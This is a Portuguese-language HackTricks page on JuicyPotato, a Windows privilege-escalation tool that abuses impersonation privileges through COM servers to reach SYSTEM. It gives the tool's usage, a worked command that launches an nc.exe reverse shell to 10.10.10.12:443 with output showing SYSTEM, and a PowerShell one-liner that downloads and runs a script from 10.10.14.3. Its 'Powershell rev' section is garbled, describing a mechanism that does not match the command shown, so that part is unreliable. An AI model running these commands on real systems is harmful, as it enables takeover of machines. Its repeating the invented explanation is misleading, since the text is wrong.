# JuicyPotato

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

{% hint style="warning" %}
**JuicyPotato não funciona** no Windows Server 2019 e no Windows 10 build 1809 em diante. No entanto, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) podem ser usados para **alavancar os mesmos privilégios e obter acesso de nível `NT AUTHORITY\SYSTEM`**. _**Verifique:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (abusando dos privilégios de ouro) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Uma versão açucarada do_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, com um pouco de suco, ou seja, **outra ferramenta de Escalada de Privilégios Locais, de Contas de Serviço do Windows para NT AUTHORITY\SYSTEM**_

#### Você pode baixar o juicypotato em [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Resumo <a href="#summary" id="summary"></a>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) e suas [variantes](https://github.com/decoder-it/lonelypotato) alavancam a cadeia de escalonamento de privilégios baseada no serviço [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) tendo o ouvinte MiTM em `127.0.0.1:6666` e quando você tem privilégios `SeImpersonate` ou `SeAssignPrimaryToken`. Durante uma revisão de compilação do Windows, encontramos uma configuração em que o `BITS` foi intencionalmente desativado e a porta `6666` foi usada.

Decidimos armar [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Diga olá para o Juicy Potato**.

> Para a teoria, veja [Rotten Potato - Escalada de Privilégios de Contas de Serviço para SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) e siga a cadeia de links e referências.

Descobrimos que, além do `BITS`, existem vários servidores COM que podemos abusar. Eles só precisam:

1. ser instanciáveis pelo usuário atual, normalmente um "usuário de serviço" que possui privilégios de impersonação
2. implementar a interface `IMarshal`
3. ser executados como um usuário elevado (SYSTEM, Administrador, ...)

Depois de alguns testes, obtivemos e testamos uma extensa lista de [CLSID's interessantes](http://ohpe.it/juicy-potato/CLSID/) em várias versões do Windows.

### Detalhes suculentos <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato permite que você:

* **CLSID de destino** _escolha qualquer CLSID que você queira._ [_Aqui_](http://ohpe.it/juicy-potato/CLSID/) _você pode encontrar a lista organizada por SO._
* **Porta de escuta COM** _defina a porta de escuta COM que você preferir (em vez do marshalled hardcoded 6666)_
* **Endereço IP de escuta COM** _vincule o servidor em qualquer IP_
* **Modo de criação de processo** _dependendo dos privilégios do usuário impersonado, você pode escolher entre:_
  * `CreateProcessWithToken` (precisa de `SeImpersonate`)
  * `CreateProcessAsUser` (precisa de `SeAssignPrimaryToken`)
  * `ambos`
* **Processo a ser iniciado** _inicie um executável ou script se a exploração tiver sucesso_
* **Argumento do processo** _personalize os argumentos do processo iniciado_
* **Endereço do servidor RPC** _para uma abordagem furtiva, você pode se autenticar em um servidor RPC externo_
* **Porta do servidor RPC** _útil se você quiser se autenticar em um servidor externo e o firewall estiver bloqueando a porta `135`..._
* **Modo de TESTE** _principalmente para fins de teste, ou seja, testar CLSIDs. Ele cria o DCOM e imprime o usuário do token. Veja_ [_aqui para testar_](http://ohpe.it/juicy-potato/Test/)

### Uso <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Pensamentos finais <a href="#final-thoughts" id="final-thoughts"></a>

Se o usuário tiver privilégios `SeImpersonate` ou `SeAssignPrimaryToken`, então você é **SYSTEM**.

É quase impossível impedir o abuso de todos esses servidores COM. Você poderia pensar em modificar as permissões desses objetos via `DCOMCNFG`, mas boa sorte, isso será desafiador.

A solução real é proteger contas e aplicativos sensíveis que são executados sob as contas `* SERVICE`. Parar o `DCOM` certamente inibiria essa exploração, mas poderia ter um impacto sério no sistema operacional subjacente.

De: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Exemplos

Nota: Visite [esta página](https://ohpe.it/juicy-potato/CLSID/) para obter uma lista de CLSIDs para tentar.

### Obter um shell reverso nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev

### Descrição

O Powershell rev é uma técnica de escalonamento de privilégios locais que explora a forma como o Windows lida com a execução de binários. Essa técnica permite que um usuário com privilégios limitados execute um binário com privilégios elevados, o que pode levar à execução de comandos maliciosos com privilégios de administrador.

### Como funciona

O Powershell rev explora a forma como o Windows lida com a execução de binários. Quando um usuário executa um binário, o Windows verifica se o usuário tem permissão para executar o binário e, em seguida, executa o binário com as permissões do usuário. No entanto, se o binário tiver a propriedade "Run as administrator" definida, o Windows executará o binário com privilégios elevados, independentemente das permissões do usuário.

O Powershell rev aproveita essa propriedade para executar um binário com privilégios elevados. Ele faz isso criando um objeto COM (Component Object Model) que é registrado como um servidor COM. Em seguida, ele cria um objeto de agendador de tarefas que é configurado para executar o objeto COM com privilégios elevados. Quando o objeto de agendador de tarefas é executado, ele executa o objeto COM com privilégios elevados, o que permite que o usuário execute comandos maliciosos com privilégios de administrador.

### Como se proteger

Para se proteger contra o Powershell rev, é recomendável que os usuários executem apenas binários de fontes confiáveis e evitem executar binários com a propriedade "Run as administrator" definida. Além disso, é recomendável que os usuários limitem o número de usuários com privilégios elevados em seus sistemas e monitorem regularmente as atividades do sistema em busca de comportamentos suspeitos.
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Abrir um novo CMD (se você tiver acesso RDP)

![](<../../.gitbook/assets/image (37).png>)

## Problemas com CLSID

Muitas vezes, o CLSID padrão que o JuicyPotato usa **não funciona** e o exploit falha. Geralmente, são necessárias várias tentativas para encontrar um **CLSID funcional**. Para obter uma lista de CLSIDs para testar em um sistema operacional específico, você deve visitar esta página:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Verificando CLSIDs**

Primeiro, você precisará de alguns executáveis além do juicypotato.exe.

Baixe o [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e carregue-o em sua sessão do PS, e baixe e execute o [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Esse script criará uma lista de possíveis CLSIDs para testar.

Em seguida, baixe o [test\_clsid.bat](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat) (altere o caminho para a lista de CLSID e para o executável juicypotato) e execute-o. Ele começará a tentar cada CLSID e **quando o número da porta mudar, significará que o CLSID funcionou**.

**Verifique** os CLSIDs funcionais **usando o parâmetro -c**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
